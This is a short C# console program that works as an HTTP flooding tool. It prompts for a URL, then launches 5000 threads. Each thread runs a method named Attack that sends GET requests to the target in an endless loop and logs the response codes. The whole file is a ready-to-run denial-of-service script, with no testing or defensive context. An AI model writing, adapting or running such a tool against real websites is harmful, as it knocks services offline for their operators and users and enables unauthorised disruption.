namespace ConsoleApp112
{

            class Program
        {
            private static readonly HttpClient _client = new HttpClient();
            private static int pcBlocks = 5000;
            public static void Main()
            {
                Console.Write("Pleace enter url : ");
                string url = Console.ReadLine()!;
                Run(url);
            }

            public static void Run(string url)
            {
                for (int i = 1; i <= pcBlocks; i++)
                {
                    Thread thread = new Thread(() => Attack(url, i));
                    thread.Start();
                }
                Console.ReadLine();
                Console.Write("Successfull");
            }

            public static void Attack(string url, int pcblockNumber)
            {
                while (true)
                {
                    HttpRequestMessage request = new HttpRequestMessage()
                    {
                        Method = HttpMethod.Get,
                        RequestUri = new Uri(url)
                    };
                    var result = _client.Send(request);
                    Console.WriteLine(pcblockNumber + "-pc received ->" + result.StatusCode);
                }
            }
        }
    }
 